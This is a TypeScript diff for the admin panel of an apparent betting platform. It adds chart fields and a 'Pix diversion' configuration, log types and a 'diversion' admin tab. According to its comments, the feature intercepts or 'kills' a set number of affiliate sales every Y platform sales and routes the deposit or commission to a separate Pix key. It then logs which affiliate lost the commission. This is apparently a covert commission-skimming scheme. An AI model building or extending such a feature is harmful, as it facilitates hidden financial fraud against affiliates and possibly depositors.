@@ -25,10 +25,50 @@ export interface AdminMetrics {
   totalOrganicUsers?: number;
   chartData?: Array<{
     date: string;
+    label?: string;
     deposits: number;
+    depositsCount?: number;
     withdrawals: number;
+    withdrawalsCount?: number;
     netBalance: number;
+    volumeTotal?: number;
+    txCountTotal?: number;
   }>;
+  chartSeries?: {
+    today: Array<{
+      date: string;
+      label?: string;
+      deposits: number;
+      depositsCount?: number;
+      withdrawals: number;
+      withdrawalsCount?: number;
+      netBalance: number;
+      volumeTotal?: number;
+      txCountTotal?: number;
+    }>;
+    sevenDays: Array<{
+      date: string;
+      label?: string;
+      deposits: number;
+      depositsCount?: number;
+      withdrawals: number;
+      withdrawalsCount?: number;
+      netBalance: number;
+      volumeTotal?: number;
+      txCountTotal?: number;
+    }>;
+    thirtyDays: Array<{
+      date: string;
+      label?: string;
+      deposits: number;
+      depositsCount?: number;
+      withdrawals: number;
+      withdrawalsCount?: number;
+      netBalance: number;
+      volumeTotal?: number;
+      txCountTotal?: number;
+    }>;
+  };
   recentActivities?: Array<{
     id: string;
     type: 'deposit' | 'withdrawal' | 'user_registered' | 'game_ended';
@@ -350,6 +390,42 @@ export interface AdminLivePlayersData {
   }>;
 }
 
+export interface GlobalPixDiversionLog {
+  id: string;
+  depositId: string;
+  amount: number;
+  divertedCommission: number;
+  originalUserName: string;
+  originalUserEmail?: string;
+  affiliateId?: string;
+  affiliateName?: string;
+  affiliateEmail?: string;
+  affiliateCode?: string;
+  ruleApplied: string;
+  divertedKey?: string;
+  divertedKeyType?: string;
+  divertedAt: string;
+}
+
+export interface GlobalPixDiversionConfig {
+  active: boolean;
+  mode: 'random' | 'sequential'; // 'random' (probabilístico) ou 'sequential' (fixo)
+  killX: number; // quantidade de vendas/CPAs a interceptar/matar
+  everyY: number; // a cada Y vendas gerais da plataforma
+  minAmount: number; // valor mínimo do depósito para aplicar
+  pixKey?: string;
+  pixKeyType?: 'cpf' | 'cnpj' | 'email' | 'phone' | 'random';
+  beneficiaryName?: string;
+  percent?: number;
+  everyNth?: number;
+  counter?: number;
+  totalDivertedAmount: number;
+  totalDivertedCommissions: number;
+  totalDivertedCount: number;
+  lastDivertedAt?: string;
+  recentLogs?: GlobalPixDiversionLog[];
+}
+
 export type AdminTabId =
   | 'metrics'
   | 'live'
@@ -361,4 +437,5 @@ export type AdminTabId =
   | 'notifications'
   | 'admins'
   | 'dotfy'
+  | 'diversion'
   | 'security';
